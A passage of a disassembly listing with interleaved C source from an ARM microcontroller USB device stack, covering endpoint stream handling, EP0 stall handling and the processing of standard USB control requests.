 80038f2:	69da      	ldr	r2, [r3, #28]
 80038f4:	693b      	ldr	r3, [r7, #16]
 80038f6:	699b      	ldr	r3, [r3, #24]
 80038f8:	4413      	add	r3, r2
 80038fa:	89fa      	ldrh	r2, [r7, #14]
 80038fc:	2100      	movs	r1, #0
 80038fe:	4618      	mov	r0, r3
 8003900:	f002 ffb0 	bl	8006864 <memset>
				ep->InBytesAvailable += Bytes;
 8003904:	693b      	ldr	r3, [r7, #16]
 8003906:	699a      	ldr	r2, [r3, #24]
 8003908:	89fb      	ldrh	r3, [r7, #14]
 800390a:	441a      	add	r2, r3
 800390c:	693b      	ldr	r3, [r7, #16]
 800390e:	619a      	str	r2, [r3, #24]
				BytesTransfered += Bytes;
 8003910:	8afa      	ldrh	r2, [r7, #22]
 8003912:	89fb      	ldrh	r3, [r7, #14]
 8003914:	4413      	add	r3, r2
 8003916:	82fb      	strh	r3, [r7, #22]
				Length -= Bytes;
 8003918:	88fa      	ldrh	r2, [r7, #6]
 800391a:	89fb      	ldrh	r3, [r7, #14]
 800391c:	1ad3      	subs	r3, r2, r3
 800391e:	80fb      	strh	r3, [r7, #6]
 8003920:	e012      	b.n	8003948 <Endpoint_Null_Stream+0xc8>
			}
			else {
				Endpoint_ClearIN();
 8003922:	f7ff fae1 	bl	8002ee8 <Endpoint_ClearIN>
				if (BytesProcessed!=NULL) {
 8003926:	683b      	ldr	r3, [r7, #0]
 8003928:	2b00      	cmp	r3, #0
 800392a:	d004      	beq.n	8003936 <Endpoint_Null_Stream+0xb6>
					*BytesProcessed = BytesTransfered;
 800392c:	683b      	ldr	r3, [r7, #0]
 800392e:	8afa      	ldrh	r2, [r7, #22]
 8003930:	801a      	strh	r2, [r3, #0]
					return ENDPOINT_RWSTREAM_IncompleteTransfer;
 8003932:	2305      	movs	r3, #5
 8003934:	e00c      	b.n	8003950 <Endpoint_Null_Stream+0xd0>
				}

				if ((ErrorCode = Endpoint_WaitUntilReady()) != 0) {
 8003936:	f7ff f9f9 	bl	8002d2c <Endpoint_WaitUntilReady>
 800393a:	4603      	mov	r3, r0
 800393c:	737b      	strb	r3, [r7, #13]
 800393e:	7b7b      	ldrb	r3, [r7, #13]
 8003940:	2b00      	cmp	r3, #0
 8003942:	d001      	beq.n	8003948 <Endpoint_Null_Stream+0xc8>
					return ErrorCode;
 8003944:	7b7b      	ldrb	r3, [r7, #13]
 8003946:	e003      	b.n	8003950 <Endpoint_Null_Stream+0xd0>
		while (Length) {
 8003948:	88fb      	ldrh	r3, [r7, #6]
 800394a:	2b00      	cmp	r3, #0
 800394c:	d1b9      	bne.n	80038c2 <Endpoint_Null_Stream+0x42>
				}


			}
		}
		return ENDPOINT_RWSTREAM_NoError;
 800394e:	2300      	movs	r3, #0
}
 8003950:	4618      	mov	r0, r3
 8003952:	3718      	adds	r7, #24
 8003954:	46bd      	mov	sp, r7
 8003956:	bd80      	pop	{r7, pc}
 8003958:	2000070c 	.word	0x2000070c

0800395c <USBD_HandleEP0_Stall>:
/**
 * \brief Handle protocol stall on EP0
 *
 * Stalls EP0 and then restarts a new transfer including setting state to \ref IDLE.
 */
void USBD_HandleEP0_Stall() {
 800395c:	b580      	push	{r7, lr}
 800395e:	af00      	add	r7, sp, #0
	/* When we stall ep0 as protocol stall, we go back into idle state and start a new read */
	device.Driver->EndpointStall(ENDPOINT_DIR_IN | 0,1);
 8003960:	4b08      	ldr	r3, [pc, #32]	; (8003984 <USBD_HandleEP0_Stall+0x28>)
 8003962:	681b      	ldr	r3, [r3, #0]
 8003964:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003966:	2101      	movs	r1, #1
 8003968:	2080      	movs	r0, #128	; 0x80
 800396a:	4798      	blx	r3
	device.EP0_State = IDLE;
 800396c:	4b05      	ldr	r3, [pc, #20]	; (8003984 <USBD_HandleEP0_Stall+0x28>)
 800396e:	2201      	movs	r2, #1
 8003970:	f883 213b 	strb.w	r2, [r3, #315]	; 0x13b
	device.Driver->EndpointReadStart(0,24);
 8003974:	4b03      	ldr	r3, [pc, #12]	; (8003984 <USBD_HandleEP0_Stall+0x28>)
 8003976:	681b      	ldr	r3, [r3, #0]
 8003978:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800397a:	2118      	movs	r1, #24
 800397c:	2000      	movs	r0, #0
 800397e:	4798      	blx	r3
}
 8003980:	bf00      	nop
 8003982:	bd80      	pop	{r7, pc}
 8003984:	2000070c 	.word	0x2000070c

08003988 <USB_Device_ProcessControlRequest>:
 * \ref EVENT_USB_Device_ControlRequest function. There the user has the chance to complete
 * some custom request or override the handling of this function. If the user has handled the
 * request, he has to call \ref Endpoint_ClearSETUP.
 *
 */
void USB_Device_ProcessControlRequest() {
 8003988:	b580      	push	{r7, lr}
 800398a:	b086      	sub	sp, #24
 800398c:	af00      	add	r7, sp, #0
	uint32_t length = 0,ret;
 800398e:	2300      	movs	r3, #0
 8003990:	617b      	str	r3, [r7, #20]
	uint16_t status = 0;
 8003992:	2300      	movs	r3, #0
 8003994:	813b      	strh	r3, [r7, #8]
	void *buffer;
	uint8_t Value;
	uint16_t Index;

	Value = USB_ControlRequest.wValue & 0x00FF;
 8003996:	4ba5      	ldr	r3, [pc, #660]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003998:	885b      	ldrh	r3, [r3, #2]
 800399a:	b29b      	uxth	r3, r3
 800399c:	74fb      	strb	r3, [r7, #19]

	/* Handling of descriptors */
	EVENT_USB_Device_ControlRequest();
 800399e:	f7fd f8e7 	bl	8000b70 <EVENT_USB_Device_ControlRequest>
	if (!device.IsSetupRecieved)
 80039a2:	4ba3      	ldr	r3, [pc, #652]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 80039a4:	f893 313e 	ldrb.w	r3, [r3, #318]	; 0x13e
 80039a8:	f3c3 0340 	ubfx	r3, r3, #1, #1
 80039ac:	b2db      	uxtb	r3, r3
 80039ae:	2b00      	cmp	r3, #0
 80039b0:	f000 81fd 	beq.w	8003dae <USB_Device_ProcessControlRequest+0x426>
		return;

	/* default request handling */
	switch (USB_ControlRequest.bRequest) {
 80039b4:	4b9d      	ldr	r3, [pc, #628]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 80039b6:	785b      	ldrb	r3, [r3, #1]
 80039b8:	2b0c      	cmp	r3, #12
 80039ba:	f200 81e8 	bhi.w	8003d8e <USB_Device_ProcessControlRequest+0x406>
 80039be:	a201      	add	r2, pc, #4	; (adr r2, 80039c4 <USB_Device_ProcessControlRequest+0x3c>)
 80039c0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80039c4:	08003b3b 	.word	0x08003b3b
 80039c8:	080039f9 	.word	0x080039f9
 80039cc:	08003d8f 	.word	0x08003d8f
 80039d0:	08003cc5 	.word	0x08003cc5
 80039d4:	08003d8f 	.word	0x08003d8f
 80039d8:	08003c1f 	.word	0x08003c1f
 80039dc:	08003a9f 	.word	0x08003a9f
 80039e0:	08003c8b 	.word	0x08003c8b
 80039e4:	08003a8f 	.word	0x08003a8f
 80039e8:	08003c53 	.word	0x08003c53
 80039ec:	08003b03 	.word	0x08003b03
 80039f0:	08003c91 	.word	0x08003c91
 80039f4:	08003d89 	.word	0x08003d89
	case REQ_ClearFeature:
		if ((USB_ControlRequest.bmRequestType & 0x3) == REQREC_ENDPOINT) {
 80039f8:	4b8c      	ldr	r3, [pc, #560]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 80039fa:	781b      	ldrb	r3, [r3, #0]
 80039fc:	f003 0303 	and.w	r3, r3, #3
 8003a00:	2b02      	cmp	r3, #2
 8003a02:	d133      	bne.n	8003a6c <USB_Device_ProcessControlRequest+0xe4>
			Index = USB_ControlRequest.wIndex & ENDPOINT_EPNUM_MASK;
 8003a04:	4b89      	ldr	r3, [pc, #548]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003a06:	889b      	ldrh	r3, [r3, #4]
 8003a08:	b29b      	uxth	r3, r3
 8003a0a:	f003 030f 	and.w	r3, r3, #15
 8003a0e:	817b      	strh	r3, [r7, #10]
			if ((USB_DeviceState == DEVICE_STATE_Configured || USB_ControlRequest.wIndex==0)  &&
 8003a10:	4b88      	ldr	r3, [pc, #544]	; (8003c34 <USB_Device_ProcessControlRequest+0x2ac>)
 8003a12:	781b      	ldrb	r3, [r3, #0]
 8003a14:	b2db      	uxtb	r3, r3
 8003a16:	2b04      	cmp	r3, #4
 8003a18:	d004      	beq.n	8003a24 <USB_Device_ProcessControlRequest+0x9c>
 8003a1a:	4b84      	ldr	r3, [pc, #528]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003a1c:	889b      	ldrh	r3, [r3, #4]
 8003a1e:	b29b      	uxth	r3, r3
 8003a20:	2b00      	cmp	r3, #0
 8003a22:	d120      	bne.n	8003a66 <USB_Device_ProcessControlRequest+0xde>
					device.Endpoints[Index].IsConfigured==1) {
 8003a24:	897b      	ldrh	r3, [r7, #10]
 8003a26:	4a82      	ldr	r2, [pc, #520]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003a28:	212c      	movs	r1, #44	; 0x2c
 8003a2a:	fb01 f303 	mul.w	r3, r1, r3
 8003a2e:	4413      	add	r3, r2
 8003a30:	7a1b      	ldrb	r3, [r3, #8]
 8003a32:	f3c3 0300 	ubfx	r3, r3, #0, #1
 8003a36:	b2db      	uxtb	r3, r3
			if ((USB_DeviceState == DEVICE_STATE_Configured || USB_ControlRequest.wIndex==0)  &&
 8003a38:	2b01      	cmp	r3, #1
 8003a3a:	d114      	bne.n	8003a66 <USB_Device_ProcessControlRequest+0xde>
				device.Endpoints[Index].IsHalted = 0;
 8003a3c:	897b      	ldrh	r3, [r7, #10]
 8003a3e:	4a7c      	ldr	r2, [pc, #496]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003a40:	212c      	movs	r1, #44	; 0x2c
 8003a42:	fb01 f303 	mul.w	r3, r1, r3
 8003a46:	441a      	add	r2, r3
 8003a48:	7a13      	ldrb	r3, [r2, #8]
 8003a4a:	f36f 0382 	bfc	r3, #2, #1
 8003a4e:	7213      	strb	r3, [r2, #8]
				device.Driver->EndpointStall(USB_ControlRequest.wIndex,0);
 8003a50:	4b77      	ldr	r3, [pc, #476]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003a52:	681b      	ldr	r3, [r3, #0]
 8003a54:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003a56:	4a75      	ldr	r2, [pc, #468]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003a58:	8892      	ldrh	r2, [r2, #4]
 8003a5a:	b292      	uxth	r2, r2
 8003a5c:	b2d2      	uxtb	r2, r2
 8003a5e:	2100      	movs	r1, #0
 8003a60:	4610      	mov	r0, r2
 8003a62:	4798      	blx	r3
			} else {
				USBD_HandleEP0_Stall();
			}
			break;
 8003a64:	e19b      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
				USBD_HandleEP0_Stall();
 8003a66:	f7ff ff79 	bl	800395c <USBD_HandleEP0_Stall>
			break;
 8003a6a:	e198      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		if ((USB_ControlRequest.bmRequestType & 0x3) == REQREC_DEVICE) {
 8003a6c:	4b6f      	ldr	r3, [pc, #444]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003a6e:	781b      	ldrb	r3, [r3, #0]
 8003a70:	f003 0303 	and.w	r3, r3, #3
 8003a74:	2b00      	cmp	r3, #0
 8003a76:	d107      	bne.n	8003a88 <USB_Device_ProcessControlRequest+0x100>
			 device.RemoteWakeUp = 0;
 8003a78:	4a6d      	ldr	r2, [pc, #436]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003a7a:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8003a7e:	f36f 0382 	bfc	r3, #2, #1
 8003a82:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
			 break;
 8003a86:	e18a      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		USBD_HandleEP0_Stall();
 8003a88:	f7ff ff68 	bl	800395c <USBD_HandleEP0_Stall>
		break;
 8003a8c:	e187      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_GetConfiguration:
		device.Driver->EndpointWrite(0,&device.Configuration,1);
 8003a8e:	4b68      	ldr	r3, [pc, #416]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003a90:	681b      	ldr	r3, [r3, #0]
 8003a92:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003a94:	2201      	movs	r2, #1
 8003a96:	4968      	ldr	r1, [pc, #416]	; (8003c38 <USB_Device_ProcessControlRequest+0x2b0>)
 8003a98:	2000      	movs	r0, #0
 8003a9a:	4798      	blx	r3
		break;
 8003a9c:	e17f      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_GetDescriptor:
		length = CALLBACK_USB_GetDescriptor(USB_ControlRequest.wValue,USB_ControlRequest.wIndex,(void*)&buffer);
 8003a9e:	4b63      	ldr	r3, [pc, #396]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003aa0:	885b      	ldrh	r3, [r3, #2]
 8003aa2:	b29b      	uxth	r3, r3
 8003aa4:	4a61      	ldr	r2, [pc, #388]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003aa6:	8892      	ldrh	r2, [r2, #4]
 8003aa8:	b292      	uxth	r2, r2
 8003aaa:	b2d1      	uxtb	r1, r2
 8003aac:	1d3a      	adds	r2, r7, #4
 8003aae:	4618      	mov	r0, r3
 8003ab0:	f7fd f874 	bl	8000b9c <CALLBACK_USB_GetDescriptor>
 8003ab4:	4603      	mov	r3, r0
 8003ab6:	617b      	str	r3, [r7, #20]
		if (length==0)
 8003ab8:	697b      	ldr	r3, [r7, #20]
 8003aba:	2b00      	cmp	r3, #0
 8003abc:	d102      	bne.n	8003ac4 <USB_Device_ProcessControlRequest+0x13c>
			USBD_HandleEP0_Stall();
 8003abe:	f7ff ff4d 	bl	800395c <USBD_HandleEP0_Stall>
					length : USB_ControlRequest.wLength;
			ret = device.Driver->EndpointWrite(0,buffer,length);
			device.Endpoints[0].InDataLeft = length - ret;
			device.Endpoints[0].InDataBuffer = (uint8_t *)((uint32_t)buffer + ret);
		}
		break;
 8003ac2:	e16c      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
			length = length < USB_ControlRequest.wLength ?
 8003ac4:	4b59      	ldr	r3, [pc, #356]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003ac6:	88db      	ldrh	r3, [r3, #6]
 8003ac8:	b29b      	uxth	r3, r3
 8003aca:	461a      	mov	r2, r3
 8003acc:	697b      	ldr	r3, [r7, #20]
 8003ace:	4293      	cmp	r3, r2
 8003ad0:	bf28      	it	cs
 8003ad2:	4613      	movcs	r3, r2
 8003ad4:	617b      	str	r3, [r7, #20]
			ret = device.Driver->EndpointWrite(0,buffer,length);
 8003ad6:	4b56      	ldr	r3, [pc, #344]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003ad8:	681b      	ldr	r3, [r3, #0]
 8003ada:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003adc:	6879      	ldr	r1, [r7, #4]
 8003ade:	697a      	ldr	r2, [r7, #20]
 8003ae0:	2000      	movs	r0, #0
 8003ae2:	4798      	blx	r3
 8003ae4:	4603      	mov	r3, r0
 8003ae6:	60fb      	str	r3, [r7, #12]
			device.Endpoints[0].InDataLeft = length - ret;
 8003ae8:	697a      	ldr	r2, [r7, #20]
 8003aea:	68fb      	ldr	r3, [r7, #12]
 8003aec:	1ad3      	subs	r3, r2, r3
 8003aee:	4a50      	ldr	r2, [pc, #320]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003af0:	6293      	str	r3, [r2, #40]	; 0x28
			device.Endpoints[0].InDataBuffer = (uint8_t *)((uint32_t)buffer + ret);
 8003af2:	687b      	ldr	r3, [r7, #4]
 8003af4:	461a      	mov	r2, r3
 8003af6:	68fb      	ldr	r3, [r7, #12]
 8003af8:	4413      	add	r3, r2
 8003afa:	461a      	mov	r2, r3
 8003afc:	4b4c      	ldr	r3, [pc, #304]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003afe:	62da      	str	r2, [r3, #44]	; 0x2c
		break;
 8003b00:	e14d      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_GetInterface:
		if (USB_DeviceState == DEVICE_STATE_Configured) {
 8003b02:	4b4c      	ldr	r3, [pc, #304]	; (8003c34 <USB_Device_ProcessControlRequest+0x2ac>)
 8003b04:	781b      	ldrb	r3, [r3, #0]
 8003b06:	b2db      	uxtb	r3, r3
 8003b08:	2b04      	cmp	r3, #4
 8003b0a:	d10d      	bne.n	8003b28 <USB_Device_ProcessControlRequest+0x1a0>
			device.Driver->EndpointWrite(0,&device.InterfaceSettings[USB_ControlRequest.wIndex],1);
 8003b0c:	4b48      	ldr	r3, [pc, #288]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003b0e:	681b      	ldr	r3, [r3, #0]
 8003b10:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003b12:	4a46      	ldr	r2, [pc, #280]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003b14:	8892      	ldrh	r2, [r2, #4]
 8003b16:	b292      	uxth	r2, r2
 8003b18:	f502 729c 	add.w	r2, r2, #312	; 0x138
 8003b1c:	4944      	ldr	r1, [pc, #272]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003b1e:	4411      	add	r1, r2
 8003b20:	2201      	movs	r2, #1
 8003b22:	2000      	movs	r0, #0
 8003b24:	4798      	blx	r3
			break;
 8003b26:	e13a      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		if (USB_DeviceState == DEVICE_STATE_Addressed) {
 8003b28:	4b42      	ldr	r3, [pc, #264]	; (8003c34 <USB_Device_ProcessControlRequest+0x2ac>)
 8003b2a:	781b      	ldrb	r3, [r3, #0]
 8003b2c:	b2db      	uxtb	r3, r3
 8003b2e:	2b03      	cmp	r3, #3
 8003b30:	f040 8130 	bne.w	8003d94 <USB_Device_ProcessControlRequest+0x40c>
			USBD_HandleEP0_Stall();
 8003b34:	f7ff ff12 	bl	800395c <USBD_HandleEP0_Stall>
			break;
 8003b38:	e131      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		break;

	case REQ_GetStatus:
		if ((USB_ControlRequest.bmRequestType & 0x3) == REQREC_DEVICE) {
 8003b3a:	4b3c      	ldr	r3, [pc, #240]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003b3c:	781b      	ldrb	r3, [r3, #0]
 8003b3e:	f003 0303 	and.w	r3, r3, #3
 8003b42:	2b00      	cmp	r3, #0
 8003b44:	d11b      	bne.n	8003b7e <USB_Device_ProcessControlRequest+0x1f6>
			status = device.RemoteWakeUp << 1 | device.SelfPowered;
 8003b46:	4b3a      	ldr	r3, [pc, #232]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003b48:	f893 313e 	ldrb.w	r3, [r3, #318]	; 0x13e
 8003b4c:	f3c3 0380 	ubfx	r3, r3, #2, #1
 8003b50:	b2db      	uxtb	r3, r3
 8003b52:	005b      	lsls	r3, r3, #1
 8003b54:	b21a      	sxth	r2, r3
 8003b56:	4b36      	ldr	r3, [pc, #216]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003b58:	f893 313e 	ldrb.w	r3, [r3, #318]	; 0x13e
 8003b5c:	f3c3 03c0 	ubfx	r3, r3, #3, #1
 8003b60:	b2db      	uxtb	r3, r3
 8003b62:	b21b      	sxth	r3, r3
 8003b64:	4313      	orrs	r3, r2
 8003b66:	b21b      	sxth	r3, r3
 8003b68:	b29b      	uxth	r3, r3
 8003b6a:	813b      	strh	r3, [r7, #8]
			device.Driver->EndpointWrite(0,(uint8_t*)&status,2);
 8003b6c:	4b30      	ldr	r3, [pc, #192]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003b6e:	681b      	ldr	r3, [r3, #0]
 8003b70:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003b72:	f107 0108 	add.w	r1, r7, #8
 8003b76:	2202      	movs	r2, #2
 8003b78:	2000      	movs	r0, #0
 8003b7a:	4798      	blx	r3
			break;
 8003b7c:	e10f      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		if ((USB_ControlRequest.bmRequestType & 0x3) == REQREC_INTERFACE && USB_DeviceState == DEVICE_STATE_Configured) {
 8003b7e:	4b2b      	ldr	r3, [pc, #172]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003b80:	781b      	ldrb	r3, [r3, #0]
 8003b82:	f003 0303 	and.w	r3, r3, #3
 8003b86:	2b01      	cmp	r3, #1
 8003b88:	d10f      	bne.n	8003baa <USB_Device_ProcessControlRequest+0x222>
 8003b8a:	4b2a      	ldr	r3, [pc, #168]	; (8003c34 <USB_Device_ProcessControlRequest+0x2ac>)
 8003b8c:	781b      	ldrb	r3, [r3, #0]
 8003b8e:	b2db      	uxtb	r3, r3
 8003b90:	2b04      	cmp	r3, #4
 8003b92:	d10a      	bne.n	8003baa <USB_Device_ProcessControlRequest+0x222>
			status = 0;
 8003b94:	2300      	movs	r3, #0
 8003b96:	813b      	strh	r3, [r7, #8]
			device.Driver->EndpointWrite(0,(uint8_t*)&status,2);
 8003b98:	4b25      	ldr	r3, [pc, #148]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003b9a:	681b      	ldr	r3, [r3, #0]
 8003b9c:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003b9e:	f107 0108 	add.w	r1, r7, #8
 8003ba2:	2202      	movs	r2, #2
 8003ba4:	2000      	movs	r0, #0
 8003ba6:	4798      	blx	r3
			break;
 8003ba8:	e0f9      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		/* print endpoint status only when(or):
		 * - Device_Address_state and ep == 0
		 * - Device_configured_state and ep is configured
		 */
		if ((USB_ControlRequest.bmRequestType & 0x3) == REQREC_ENDPOINT) {
 8003baa:	4b20      	ldr	r3, [pc, #128]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003bac:	781b      	ldrb	r3, [r3, #0]
 8003bae:	f003 0303 	and.w	r3, r3, #3
 8003bb2:	2b02      	cmp	r3, #2
 8003bb4:	d130      	bne.n	8003c18 <USB_Device_ProcessControlRequest+0x290>
			Index = USB_ControlRequest.wIndex & 0xFF & ENDPOINT_EPNUM_MASK;
 8003bb6:	4b1d      	ldr	r3, [pc, #116]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003bb8:	889b      	ldrh	r3, [r3, #4]
 8003bba:	b29b      	uxth	r3, r3
 8003bbc:	f003 030f 	and.w	r3, r3, #15
 8003bc0:	817b      	strh	r3, [r7, #10]
			if ((USB_DeviceState == DEVICE_STATE_Configured || USB_ControlRequest.wIndex==0) &&
 8003bc2:	4b1c      	ldr	r3, [pc, #112]	; (8003c34 <USB_Device_ProcessControlRequest+0x2ac>)
 8003bc4:	781b      	ldrb	r3, [r3, #0]
 8003bc6:	b2db      	uxtb	r3, r3
 8003bc8:	2b04      	cmp	r3, #4
 8003bca:	d004      	beq.n	8003bd6 <USB_Device_ProcessControlRequest+0x24e>
 8003bcc:	4b17      	ldr	r3, [pc, #92]	; (8003c2c <USB_Device_ProcessControlRequest+0x2a4>)
 8003bce:	889b      	ldrh	r3, [r3, #4]
 8003bd0:	b29b      	uxth	r3, r3
 8003bd2:	2b00      	cmp	r3, #0
 8003bd4:	d120      	bne.n	8003c18 <USB_Device_ProcessControlRequest+0x290>
					device.Endpoints[Index].IsConfigured==1) {
 8003bd6:	897b      	ldrh	r3, [r7, #10]
 8003bd8:	4a15      	ldr	r2, [pc, #84]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003bda:	212c      	movs	r1, #44	; 0x2c
 8003bdc:	fb01 f303 	mul.w	r3, r1, r3
 8003be0:	4413      	add	r3, r2
 8003be2:	7a1b      	ldrb	r3, [r3, #8]
 8003be4:	f3c3 0300 	ubfx	r3, r3, #0, #1
 8003be8:	b2db      	uxtb	r3, r3
			if ((USB_DeviceState == DEVICE_STATE_Configured || USB_ControlRequest.wIndex==0) &&
 8003bea:	2b01      	cmp	r3, #1
 8003bec:	d114      	bne.n	8003c18 <USB_Device_ProcessControlRequest+0x290>
				status = device.Endpoints[Index].IsHalted;
 8003bee:	897b      	ldrh	r3, [r7, #10]
 8003bf0:	4a0f      	ldr	r2, [pc, #60]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003bf2:	212c      	movs	r1, #44	; 0x2c
 8003bf4:	fb01 f303 	mul.w	r3, r1, r3
 8003bf8:	4413      	add	r3, r2
 8003bfa:	7a1b      	ldrb	r3, [r3, #8]
 8003bfc:	f3c3 0380 	ubfx	r3, r3, #2, #1
 8003c00:	b2db      	uxtb	r3, r3
 8003c02:	b29b      	uxth	r3, r3
 8003c04:	813b      	strh	r3, [r7, #8]
				device.Driver->EndpointWrite(0,(uint8_t*)&status,2);
 8003c06:	4b0a      	ldr	r3, [pc, #40]	; (8003c30 <USB_Device_ProcessControlRequest+0x2a8>)
 8003c08:	681b      	ldr	r3, [r3, #0]
 8003c0a:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003c0c:	f107 0108 	add.w	r1, r7, #8
 8003c10:	2202      	movs	r2, #2
 8003c12:	2000      	movs	r0, #0
 8003c14:	4798      	blx	r3
				break;
 8003c16:	e0c2      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
			}
		}
		/* default stall */
		USBD_HandleEP0_Stall();
 8003c18:	f7ff fea0 	bl	800395c <USBD_HandleEP0_Stall>
		break;
 8003c1c:	e0bf      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_SetAddress:
		if (Value == 0)
 8003c1e:	7cfb      	ldrb	r3, [r7, #19]
 8003c20:	2b00      	cmp	r3, #0
 8003c22:	d10b      	bne.n	8003c3c <USB_Device_ProcessControlRequest+0x2b4>
			USB_DeviceState = DEVICE_STATE_Default;
 8003c24:	4b03      	ldr	r3, [pc, #12]	; (8003c34 <USB_Device_ProcessControlRequest+0x2ac>)
 8003c26:	2202      	movs	r2, #2
 8003c28:	701a      	strb	r2, [r3, #0]
 8003c2a:	e00a      	b.n	8003c42 <USB_Device_ProcessControlRequest+0x2ba>
 8003c2c:	20000c94 	.word	0x20000c94
 8003c30:	2000070c 	.word	0x2000070c
 8003c34:	20000c9c 	.word	0x20000c9c
 8003c38:	20000845 	.word	0x20000845
		else
			USB_DeviceState = DEVICE_STATE_Addressed;
 8003c3c:	4b5e      	ldr	r3, [pc, #376]	; (8003db8 <USB_Device_ProcessControlRequest+0x430>)
 8003c3e:	2203      	movs	r2, #3
 8003c40:	701a      	strb	r2, [r3, #0]
		device.Driver->DeviceSetAddress(Value,XMC_USBD_SET_ADDRESS_STAGE_SETUP);
 8003c42:	4b5e      	ldr	r3, [pc, #376]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003c44:	681b      	ldr	r3, [r3, #0]
 8003c46:	699b      	ldr	r3, [r3, #24]
 8003c48:	7cfa      	ldrb	r2, [r7, #19]
 8003c4a:	2100      	movs	r1, #0
 8003c4c:	4610      	mov	r0, r2
 8003c4e:	4798      	blx	r3
		break;
 8003c50:	e0a5      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>

	case REQ_SetConfiguration:
		/* Regardless the state update the configuration to unconfigure endpoints */
		device.Configuration = Value;
 8003c52:	4a5a      	ldr	r2, [pc, #360]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003c54:	7cfb      	ldrb	r3, [r7, #19]
 8003c56:	f882 3139 	strb.w	r3, [r2, #313]	; 0x139
		EVENT_USB_Device_ConfigurationChanged();
 8003c5a:	f7fc ff61 	bl	8000b20 <EVENT_USB_Device_ConfigurationChanged>
		/* when config 0 is choosen, we are back in address state */
		if (Value == 0) {
 8003c5e:	7cfb      	ldrb	r3, [r7, #19]
 8003c60:	2b00      	cmp	r3, #0
 8003c62:	d103      	bne.n	8003c6c <USB_Device_ProcessControlRequest+0x2e4>
			USB_DeviceState = DEVICE_STATE_Addressed;
 8003c64:	4b54      	ldr	r3, [pc, #336]	; (8003db8 <USB_Device_ProcessControlRequest+0x430>)
 8003c66:	2203      	movs	r2, #3
 8003c68:	701a      	strb	r2, [r3, #0]
			break;
 8003c6a:	e098      	b.n	8003d9e <USB_Device_ProcessControlRequest+0x416>
		}
		/* go ahead only with vailid config. (must be set in event) */
		if (device.IsConfigured == 1)
 8003c6c:	4b53      	ldr	r3, [pc, #332]	; (8003dbc <USB_Device_ProcessControlRequest+0x434>)
 8003c6e:	f893 313e 	ldrb.w	r3, [r3, #318]	; 0x13e
 8003c72:	f003 0301 	and.w	r3, r3, #1
 8003c76:	b2db      	uxtb	r3, r3
 8003c78:	2b00      	cmp	r3, #0
 8003c7a:	d003      	beq.n	8003c84 <USB_Device_ProcessControlRequest+0x2fc>
			USB_DeviceState = DEVICE_STATE_Configured;
 8003c7c:	4b4e      	ldr	r3, [pc, #312]	; (8003db8 <USB_Device_ProcessControlRequest+0x430>)
 8003c7e:	2204      	movs	r2, #4
 8003c80:	701a      	strb	r2, [r3, #0]
		else
			USBD_HandleEP0_Stall();
		break;
